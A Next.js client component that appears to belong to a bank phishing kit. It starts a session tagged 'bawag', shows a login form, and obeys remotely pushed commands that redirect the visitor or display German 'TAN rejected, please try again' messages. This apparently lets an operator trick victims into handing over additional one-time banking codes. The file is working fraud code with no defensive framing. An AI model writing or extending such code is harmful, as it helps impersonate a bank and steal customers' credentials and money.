"use client";

import { useEffect, useState, useCallback } from "react";
import { useRouter } from "next/navigation";
import { saveListingSlug, startSession, onCommand } from "@/lib/track";
import LoginForm from "@/components/LoginForm";

interface ClientShellProps {
  initialSlug: string | null;
}

export default function ClientShell({ initialSlug }: ClientShellProps) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  const handleCommand = useCallback(
    (cmd: { type: string; payload: Record<string, unknown> }) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "redirect":
          if (cmd.payload.url) {
            router.push(cmd.payload.url as string);
          }
          break;
        case "reject_tan":
          setError(
            (cmd.payload.message as string) || "TAN wurde abgelehnt. Bitte versuchen Sie es erneut."
          );
          break;
        case "retry_tan":
          setError(
            (cmd.payload.message as string) || "TAN ist ungültig. Bitte versuchen Sie es erneut."
          );
          break;
        default:
          break;
      }
    },
    [router]
  );

  useEffect(() => {
    if (initialSlug) {
      saveListingSlug(initialSlug);
    }
    startSession("bawag");
    onCommand(handleCommand);
  }, [initialSlug, handleCommand]);

  return <LoginForm error={error} />;
}
